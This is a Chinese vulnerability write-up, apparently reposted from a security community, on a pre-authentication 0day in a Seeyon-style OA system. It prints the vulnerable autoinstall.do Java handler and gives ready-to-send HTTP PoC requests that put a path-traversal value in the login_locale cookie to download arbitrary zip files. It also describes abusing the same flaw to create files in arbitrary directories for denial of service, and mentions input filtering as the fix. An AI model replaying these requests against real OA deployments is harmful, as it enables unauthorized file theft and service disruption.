#  记一次某大型oa前台0day挖掘  
1771593898321415
                    1771593898321415  HACK之道   2026-03-20 00:10  
  
## 作者：1771593898321415（先知社区）  
## 原文：https://xz.aliyun.com/news/91624  
  
   
  
### 漏洞sink发现（任意zip文件下载）  
  
  
   
  
1.想要寻找文件下载相关的漏洞，自然的联想到下载相关的请求头写法：  
  
```
response.setHeader("Content-Disposition",
```  
  
  
2.将Lib文件中的jar包拖入jadx-gui进行寻找：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48e2mF6pcC3BzOz07nWeUmz9R6JmSxPW70epYTM33rd5ZthWY7Gk4WQrRb28fobia0CicOtOC9409Cef7ZtxHXKw6rBib1uQibDMZg/640?wx_fmt=png&from=appmsg "")  
  
3.最终定位到如图所示代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icicjnkmSZpcgLujbbfCia1KHg0c3ib8wDfyZI0fznOLWnFUiaLAypk8BwmiaVOMWyoaRrUGUCUNmPKXxCTmzlTt0ZgPWTsibntic2qq4/640?wx_fmt=png&from=appmsg "")  
  
4.往上跟发现是从cookie里面获取的（cookie内容我们是可控的）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibqDSd1rFhOL3pZDcU0JKPkx39GdyicSXy6SAUibaQqbjBykxhDX0JQYu2ZjpSKJz5hupfRncKPcaQ5DVBpOuZbh7F52k3ZTQ1mo/640?wx_fmt=png&from=appmsg "")  
## poc构造  
  
1.我们复制文件的路径com.seeyon.apps.autoinstall.controller.AutoInstallController，在idea中搜索：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49stGfyAEqTZ2aiayZb0M3JzerZDiaGCokvZtxbNzftVQDPjcRWr9ibPDZojicJJticrbXKVLckwR8vBny8ho5W53Qe7ndKue6SiaZicQ/640?wx_fmt=png&from=appmsg "")  
  
这个bean标签的name属性，就是我们需要访问的路由：autoinstall.do  
  
2.跟进发现AutoInstallController继承BaseController，而BaseController又继承MultiActionController：  
  
而且注意，这里有**@NeedlessCheckLogin**  
注解，说明这里是一个前台就能访问的点，**不需要登录**  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48HdhGISF76kSqrIrtLNibSOQjicOiaw3PVN4NtUlCytTeBrBGxT5ubia5IQAsAPROIicSibYC1l5ZicznQG3Kwic3wZvTxH9hgYUlicIoM/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49ykPYSWibo0FUSic4KOYLXSXmuUte6cgialWu8N6MoV1qS3TQ62d7fyqGw9reTsZDfZndzuLzWaKGNIb97RV0p3WuyGnyibwpxYZk/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
这里补充一个知识点：MultiActionController是Spring MVC早期提供的一个多方法分发控制器基类   
  
我们可以通过搜索methodNameResolver，找到传参方式：这里的value的值就是我们传参的值，也就是method=xxx （xxx为函数名）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48cUic6WwLiaRw8YEvOicx9QkiatNSs4tArYvicfLq6Ax6cjyzyrCe65Gouibd3muiazRmvqdal72SLVibNiaHZfb28GZibbAl7glEjWNrOQ/640?wx_fmt=png&from=appmsg "")  
  
3.来到漏洞函数：  
```
@SetContentType
public ModelAndView regInstallDown64(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String localeName = "";
    Cookie[] cookies = request.getCookies();

    for(Cookie cookie : cookies) {
        if ("login_locale".equals(cookie.getName())) {
            localeName = cookie.getValue();
        }
    }

    if (Strings.isBlank(localeName)) {
        String lang = request.getHeader("Accept-Language");
        Locale defaultLocale = lang == null ? (Locale)LocaleContext.getAllLocales().get(0) : LocaleContext.parseLocale(lang);
        localeName = I18nUtil.getLocalAsString(defaultLocale);
    }

    if (localeName.contains(",")) {
        localeName = localeName.substring(0, localeName.indexOf(","));
    }

    String separator = System.getProperty("file.separator");
    String fileName = SystemEnvironment.getSystemTempFolder() + separator + "regInstall64_" + request.getServerName() + "_" + localeName + ".zip";
    String url = request.getRequestURL().toString();
    url = url.substring(0, url.indexOf(SystemEnvironment.getContextPath() + "/"));
    OutputStream out = null;
    BufferedInputStream br = null;
    BufferedWriter writer = null;

    try {
        if (!(new CtpLocalFile(fileName)).exists()) {
            String productLine = SystemEnvironment.getProductLine().replace("V5", "").replace("+", "");
            String regDir1 = SystemEnvironment.getApplicationFolder() + separator + "autoinstall" + separator + "regInstall64";
            String regDir2 = SystemEnvironment.getApplicationFolder() + separator + "autoinstall" + separator + "V5Common";
            String tempDir = SystemEnvironment.getSystemTempFolder() + separator + UUID.randomUUID().toString() + separator + "regInstall64";
            String urlTxt = tempDir + separator + "SeeyonActivexInstall" + separator + "url.txt";
            String localeTxt = tempDir + separator + "SeeyonActivexInstall" + separator + "locale.txt";
            CtpLocalFile tempFile = new CtpLocalFile(tempDir);
            if (!tempFile.exists()) {
                tempFile.mkdirs();
            }

            FileUtils.copyDirectoryToDirectory(new CtpLocalFile(regDir2), new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall"));
            FileUtils.moveDirectory(new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall" + separator + "V5Common"), new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall" + separator + productLine));
            FileUtils.copyDirectoryToDirectory(new CtpLocalFile(regDir1), new CtpLocalFile((new CtpLocalFile(tempDir)).getParent()));
            CtpLocalFile urlFile = new CtpLocalFile(urlTxt);
            if (!urlFile.exists()) {
                urlFile.createNewFile();
            }

            CtpLocalFile localeFile = new CtpLocalFile(localeTxt);
            if (!localeFile.exists()) {
                localeFile.createNewFile();
            }

            BufferedWriter var32 = new BufferedWriter(new FileWriter(new CtpLocalFile(urlTxt)));
            var32.write(url);
            var32.flush();
            var32.close();
            writer = new BufferedWriter(new FileWriter(new CtpLocalFile(localeTxt)));
            writer.write(localeName);
            writer.flush();
            writer.close();
            if (!(new CtpLocalFile(fileName)).exists()) {
                ZipUtil.zip(new CtpLocalFile(tempDir), new CtpLocalFile(fileName), false, "GBK", ResourceUtil.getString("common.auto.install.Note2"));
            }
        }

        br = new BufferedInputStream(new FileInputStream(fileName));
        byte[] buf = new byte[1024];
        int len = 0;
        response.setContentType("application/x-msdownload; charset=UTF-8");
        response.setHeader("Content-disposition", "attachment;filename=\"SeeyonActivexInstall64_" + localeName + ".zip\"");
        out = response.getOutputStream();

        while((len = br.read(buf)) > 0) {
            out.write(buf, 0, len);
        }
    } catch (Exception e) {
        if (e.getClass().getSimpleName().equals(this.clientAbortExceptionName)) {
            log.debug("辅助程序下载异常：" + e.getMessage());
        } else {
            log.error("", e);
        }
    } finally {
        if (out != null) {
            out.close();
        }

        if (br != null) {
            br.close();
        }

        if (writer != null) {
            writer.close();
        }

    }

    return null;
}
```  
  
4.我们先构造数据包，传入正常的cookie进行调试，找到文件读取的路径，如图：  
  
（**构造流程如下：该oa有一个contextPath为seeyon，大多数的路由都是以seeyon为根路由，而autoinstall.do正是我们之前寻找到的Controller对应bean属性的name值，method=漏洞存在的函数**  
）  
```
POST /seeyon/autoinstall.do HTTP/1.1
Host: 192.168.127.129
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.127.129
Referer: http://192.168.127.129/seeyon/main.do?method=main
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: login_locale=zh_CN;
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

method=regInstallDown64
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49mS5ImCglCffS9wmb0cHdVTZpwC9RcfPwMaSIL7KVCzcNLSuEcR4cVwdgK4LbqCuMUee91BhqRNOtqrGjOTJcH2ylGuhGDHibY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48a0IdhaQBBOgunyqqVnup4xZNuXunIXIjjGl9L4FXTcxtSbJ34n0BH2iaqwwJTDdUpAhOUsBEFI2gAnyYuR2cUuqWv7Lvtovyc/640?wx_fmt=png&from=appmsg "")  
  
这里，我们找到了正常流程所在的目录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49F6ZDRvibxlPia5b2VJ0I5kNXRjHkejHs1TLHJgibMApRxUD2tpB1ibDMvfRdZDS6ZAfXfZ3GEibrDK8MI5D7WNqap8xicr41SdIcicg/640?wx_fmt=png&from=appmsg "")  
  
下载在这里：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49VZu3oSVia3lFicF1jW2Xgn3DPBjUaQib6uJLUic6HvYDqltC7GYdZDac5VTkKBFMveRTP0LuiaEZs4ZfyGEOhcGOnibUaXddSYvaS4/640?wx_fmt=png&from=appmsg "")  
  
5.知道了文件所在路径，**由于cookie中并没有对目录穿越字符../的限制，代码中也没有对../进行限制**  
，因此我们可以对login_locale进行构造，读取任意目录下的zip文件。  
  
6.假设Logs目录存在一份打包过的Logs.zip文件，这里我们尝试读取它：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48IIRmjZ0Y8ZxpOETmibPeN5uvhVhbGwx2j698rMT9HTSA8MrqRicPM6icvaKZjn5HwzsQQk26we1v5fsy9hqx0HvoevrYefhz93c/640?wx_fmt=png&from=appmsg "")  
  
根据上一步可知，我们之前的目录在C:\Seeyon\A8\base\temporary ，这样子是相差了两层目录，而代码中：  
```
String fileName = SystemEnvironment.getSystemTempFolder() + separator + "regInstall64_" + request.getServerName() + "_" + localeName + ".zip";
```  
  
这里如果我们使用目录穿越，也就是localeName存在../字符，那么前面的"regInstall64_" + request.getServerName() + "_"又会多出一个不存在的目录，因此我们需要跨越三层目录才能够读到Logs.zip。  
  
漏洞poc如下：（构造login_locale=/../../../Logs;）  
```
POST /seeyon/autoinstall.do HTTP/1.1
Host: 192.168.127.129
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.127.129
Referer: http://192.168.127.129/seeyon/main.do?method=main
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: login_locale=/../../../Logs;
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

method=regInstallDown64
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49ibCGhicJVicwORE2al2FhQlOoNs9k0YuIOOsPPmub1Yp0LiaTAkz0TEJia6bnQGNrCzAy6AfxqU3mlvXjqG3LUJdHvHgNqBh0iaOAA/640?wx_fmt=png&from=appmsg "")  
  
成功在前台读取到Logs.zip文件。  
  
7.我们使用成功的payload，再跟一下代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icttKhggGY2duliaBj3aKdD0Lnn5bjrzic1EKTficiaZ2ymhm0nxqbiasmXEqF2aicrqbEibcVCzOWh9JiajqYWSYzU2vbNha3Ayu9Vfz0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48PRWLzrAqqOho8SO1fyLenLibVIcEbUGmY7ibXm5A7WI2bTeuuL4bpm1Xybm3yuF9OZkDgFaVV0k8uQ6LDBav88yGlfyABKHTRQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到，这里已经跨目录成功  
## 漏洞延伸（dos攻击）  
  
1.分析完漏洞可以发现，该漏洞可以读取系统中的任意zip文件，但是我们不好猜测文件的名字，因此略显鸡肋，因此我们继续看代码，看看有没有能够对系统造成破坏的点。  
  
2.问题就出现在这里：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icUSFrgEj1uibEWQKYIib4VpwbNlTscqrOZWRm4icQht7HvCibq67VcY6wgKa2aehHIibxVotCw6DGcUDS8bAjIE4tJfF7zEvUxzb6c/640?wx_fmt=png&from=appmsg "")  
  
这里的CtpLocalFile就是对原生File类的一个封装，这段话的意思就是，如果fileName不存在，就重新创建一个，并且把一堆东西放入fileName，那这个fileName是什么呢，就是我们传入的login_locale进行拼接的呀，也就是说，我们可以**短时间内传入任意名字的压缩包到任意目录，进行dos攻击：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49qGcBBMvnbbworp8RpZrbVteibVuLxHmbNHXicPK9j0r9QwLX7f4sTBBw0w7KNwBybgRtdbhH6F1cHoY2VVws3ubfCfhXMgmEN8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD480pDeWFqBaiaV9n7wU03g3TXmkchEVfSBcDGNunxSUyuHoAticXpL8rAJoB8Jh4Eib71onuiaK4ZAricicQtfzYaUbJg5RBo69icEWWM/640?wx_fmt=png&from=appmsg "")  
## 漏洞防护  
  
说到防护，那自然是对login_locale进行字符过滤，防止传入../等恶意字符串进行跨目录的操作。  
  
  
  
  
  
  
  
  
  
  
